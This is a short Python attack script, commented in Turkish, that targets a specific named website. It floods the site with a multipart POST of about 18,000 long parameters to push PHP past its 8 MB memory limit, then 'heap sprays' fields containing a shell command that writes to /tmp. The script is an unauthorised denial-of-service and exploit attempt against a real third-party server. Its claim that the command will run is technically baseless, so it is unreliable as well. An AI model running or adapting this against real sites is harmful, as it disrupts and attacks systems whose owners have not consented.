import requests

TARGET_URL = "http://www.texni-gypsos.gr/?content=Products&section=15&subsection=1" 

print("[*] Gelistirilmis PHP 8.4.26 OOM POST Testi Baslatiliyor...")

# Apache'nin 400 hatasi vermemesi icin basliklari temiz tutuyoruz
headers = {
    "User-Agent": "Mozilla/5.0",
}

# PHP $_POST dizisini buyutecek form verileri (Payload)
# Hem parametre sayisi fazla olmali hem de her parametre RAM'de yer kaplamali
print("[*] Multipart form verileri hazirlaniyor...")
payload_data = {}

# 1. Asama: Bellegi 8M sinirinin hemen altina (yaklasik 7.8 MB) getirme
# 18.000 adet 300 karakterlik rastgele parametre uretiyoruz
for i in range(18000):
    uzun_parametre_adi = f"form_field_param_index_{i}_" + ("A" * 300)
    payload_data[uzun_parametre_adi] = "1"

# 2. Asama: Tam 8M sinir cizgisine (Heap Spraying) tuzagi yerlestirme
print("[*] Sinir cizgisine tekrarlayan test komutlari enjekte ediliyor...")
for x in range(50):
    tuzak_adi = f"tuzak_{x}_" + ("B" * 200)
    # Calistirilacak komut (Binary/Shellcode simulasyonu)
    payload_data[tuzak_adi] = "echo 'Zafiyet Tetiklendi' > /tmp/test.txt"


print("[*] Buyuk POST istegi sunucuya gonderiliyor (Bekleyiniz)...")
# Veriyi 'data=' parametresiyle gonderdigimizde requests bunu multipart form olarak iletir
response = requests.post(TARGET_URL, data=payload_data, headers=headers, timeout=1500)
print(response.text)
print(f"\n[+] Sunucu Yanit Kodu: {response.status_code}")
print(f"[+] Sunucu Yaniti: {response.text[:200]}")

